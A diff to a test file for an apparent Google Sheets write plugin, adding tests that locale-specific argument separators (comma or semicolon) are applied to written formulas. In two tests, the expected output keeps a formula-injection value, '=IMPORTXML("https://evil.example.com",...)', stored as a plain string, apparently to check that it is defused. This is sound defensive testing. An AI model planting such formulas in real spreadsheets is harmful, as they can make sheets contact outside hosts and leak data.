@@ -1,6 +1,7 @@
 import type { TestRecipeOptions } from '@tyto/plugin-api/testing';
 import { afterEach, describe, expect, it } from 'vitest';
 
+import { formulaSeparator, localFormula } from '../src/sheet-cells.js';
 import { applySheetWrites, NOT_REACHED } from '../src/sheet-write-apply.js';
 import { testClock, testKey, tokenEndpoint } from './google.js';
 import { googleHost, response } from './host.js';
@@ -244,6 +245,29 @@ describe('google.sheet-write cells', () => {
       { userEnteredValue: { stringValue: '=IMPORTXML("https://evil.example.com","//a")' } },
       { userEnteredValue: { formulaValue: '=SUM(1,2)' } },
     ]);
+  });
+
+  it("writes a formula with the argument separator of the sheet's locale", async () => {
+    const sheet = await google({ tabs: [oldTab()], version: '1', locale: 'pt_BR' });
+    const answer = await planAndApply(
+      sheet,
+      'google.sheet-write mode=replace formulas=total',
+      sums(),
+    );
+    expect(answer.plan?.operations[2]?.description).toMatch(/\| =SUM\(1;2\)$/);
+    expect(cellsWritten(sheet).get(2)).toEqual([
+      { userEnteredValue: { stringValue: '=IMPORTXML("https://evil.example.com","//a")' } },
+      { userEnteredValue: { formulaValue: '=SUM(1;2)' } },
+    ]);
+  });
+
+  it.each([
+    ['en_US', '=IF(A1="a,b",SUM(1,2),0)', '=IF(A1="a,b",SUM(1,2),0)'],
+    ['pt_BR', '=IF(A1="a,b",SUM(1,2),0)', '=IF(A1="a,b";SUM(1;2);0)'],
+    ['de_DE', "=SUM('Q1, Q2'!A1,{1,2})", "=SUM('Q1, Q2'!A1;{1,2})"],
+    ['', '=MAX(1,2)', '=MAX(1,2)'],
+  ])('writes for locale %j %s as %s', (locale, written, local) => {
+    expect(localFormula(written, formulaSeparator(locale))).toBe(local);
   });
 
   it('refuses formulas= naming a column the table does not write', async () => {
